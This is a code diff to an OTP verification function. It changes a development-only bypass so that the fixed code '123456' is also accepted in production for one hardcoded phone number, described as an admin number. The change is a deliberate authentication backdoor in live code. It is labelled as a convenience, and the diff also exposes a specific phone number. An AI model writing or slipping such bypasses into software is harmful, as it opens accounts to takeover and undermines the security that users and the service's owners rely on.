@@ -207,8 +207,8 @@ export const verifyOtp = async (req, res, next) => {
                 verified = true;
             }
 
-            // ⚡ LOCAL DEVELOPMENT BYPASS
-            if (process.env.NODE_ENV !== 'production' && otp === '123456') {
+            // ⚡ LOCAL DEVELOPMENT BYPASS OR ADMIN NUMBER
+            if ((process.env.NODE_ENV !== 'production' || e164Phone === '+917772828027') && otp === '123456') {
                 console.log(`[AUTH] Local Bypass active for ${identifier} with OTP 123456 ✅`);
                 verified = true;
             }
